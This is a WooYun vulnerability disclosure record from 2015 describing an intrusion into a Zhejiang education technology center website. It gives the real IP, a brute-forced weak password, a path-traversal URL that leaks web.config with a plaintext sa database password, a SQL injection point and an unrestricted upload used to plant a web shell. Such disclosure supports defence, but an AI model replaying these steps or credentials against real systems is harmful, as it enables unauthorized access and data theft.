{"id": 25080, "wybug_id": "wooyun-2015-0132987", "wybug_title": "浙江省教育技术中心某站漏洞打包并getshell", "wybug_corp": "浙江省教育技术中心", "wybug_author": "想个霸气的名字好难", "wybug_date": "2015-08-10 10:26", "wybug_open_date": "2015-09-24 16:08", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向公众公开  简要描述： 一切由一个弱口令引发 详细说明：  http://122.225.201.204:8081/login.aspx 登录接口无限制，burp 发包爆破 得弱口令一枚chenying 12345678 登录系统界面见下图\n\n进去后左看看，右瞧瞧，发现任意文件下载一处：http://122.225.201.204:8081/CodeTree/DownFile.aspx?fileurl=UpFile/../web.config遂得mssql连接：\n<connectionStrings>\t\t<add name=\"kjmisConnectionString\" connectionString=\"Data Source=jytoavm04;Initial Catalog=kjmis_zjjky;User ID=sa;Password=jky#2014\" providerName=\"System.Data.SqlClient\" />\t\t<!-- 程序和数据库不在同一台服务器上设置值net use z: \\\\192.1.1.176\\c$\\DB 1 /user:192.1.1.176\\administrator，如果在同一台机器上设置为空 -->\t\t<add name=\"networkdevice\" connectionString=\"\" />\t\t<add name=\"DatabaseName\" connectionString=\"kjmis_zjjky\" />\t</connectionStrings>\n还好1433不对外开放继续到处翻翻，发现sql注入一枚：http://122.225.201.204:8081/help.aspx?Id=5sqlmap跑下：\n\n嫌sqlmap跑的慢，再到处看看，于是发现任意文件上传一处（致命伤）：\n\n直接上传任意文件，都不带改包的！最后：\n\n   漏洞证明：  \n<connectionStrings>\t\t<add name=\"kjmisConnectionString\" connectionString=\"Data Source=jytoavm04;Initial Catalog=kjmis_zjjky;User ID=sa;Password=jky#2014\" providerName=\"System.Data.SqlClient\" />\t\t<!-- 程序和数据库不在同一台服务器上设置值net use z: \\\\192.1.1.176\\c$\\DB 1 /user:192.1.1.176\\administrator，如果在同一台机器上设置为空 -->\t\t<add name=\"networkdevice\" connectionString=\"\" />\t\t<add name=\"DatabaseName\" connectionString=\"kjmis_zjjky\" />\t</connectionStrings>\n\n\n\n\n   修复方案：  强制密码策略；登录限制；过滤；上传文件类型限制；上传文件夹权限控制。。。。。upfile文件夹，有马记得删除！   版权声明：转载请注明来源 想个霸气的名字好难@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-10 16:07 厂商回复： 感谢小伙伴的提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}